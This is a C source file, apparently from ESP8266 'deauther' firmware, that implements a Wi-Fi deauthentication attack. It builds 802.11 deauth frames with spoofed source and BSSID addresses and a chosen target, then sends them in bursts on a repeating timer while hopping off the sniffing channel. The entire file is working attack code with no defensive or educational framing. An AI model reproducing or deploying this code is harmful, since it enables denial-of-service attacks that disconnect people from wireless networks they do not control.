#include "../include/deauther.h"

//Function firms
void ICACHE_FLASH_ATTR deauth_start(uint8_t ch, uint8_t *source, uint8_t *dest);
void ICACHE_FLASH_ATTR deauth_stop();
void ICACHE_RAM_ATTR attack_deauth_cb(void *arg);

/* --- STRUCTURES --- */
typedef struct __attribute__((packed)){
  wifi_ieee80211_mac_hdr_t mac_hdr;  ///DA CONTROLLARE CHE SIA CORRETTO
  uint16_t deaut_reason_code;
} deauth_pkt_t;

/* --- GLOBAL VARIABLES --- */
bool status_deauth = false;
deauth_pkt_t deauth_pkt;
os_timer_t deauth_attack_timer;
int target_channel = 0;

//Functions implementation
void ICACHE_FLASH_ATTR deauth_start(uint8_t ch, uint8_t *source, uint8_t *dest){
  target_channel = ch;
  ///DEAUTH:Crafting the deauth_pkt
  memset(&deauth_pkt, 0, sizeof(deauth_pkt_t));
  deauth_pkt.mac_hdr.frame_ctrl.type     = WIFI_PKT_MGMT; 
  deauth_pkt.mac_hdr.frame_ctrl.subtype  = DEAUTHENTICATION;//DISASSOCIATION;
  memcpy(deauth_pkt.mac_hdr.addr1, dest,   6);   // dest
  memcpy(deauth_pkt.mac_hdr.addr2, source, 6);   // source
  memcpy(deauth_pkt.mac_hdr.addr3, source, 6);   // BSSID
  deauth_pkt.deaut_reason_code = 0x02;//IEEE80211_REASON_AUTH_NO_LONGER_VALID;
  //FCS (Frame Check Sequence) & Duration: SKD takes care of that
  ///TIMER: setup timer for deauth attack
  os_timer_disarm(&deauth_attack_timer);
  os_timer_setfn(&deauth_attack_timer, (os_timer_func_t *)attack_deauth_cb, NULL);
  os_timer_arm(&deauth_attack_timer, CH_DEAUTH_PERIOD, true);  // true = repeat
  status_deauth = true;
}

void ICACHE_FLASH_ATTR deauth_stop(){
  os_timer_disarm(&deauth_attack_timer);
  status_deauth = false;
}

void ICACHE_RAM_ATTR attack_deauth_cb(void *arg){
  int sniff_channel = wifi_get_channel();
  wifi_promiscuous_enable(false);
  wifi_set_channel(target_channel);
  
  unsigned long completion_time = millis() + 1;
  while(millis() < completion_time) ;

  for(int i=0; i<BURST; i++) wifi_send_pkt_freedom((uint8_t *) &deauth_pkt, 26, false);
  
  wifi_set_channel(sniff_channel);
  wifi_promiscuous_enable(true);
}
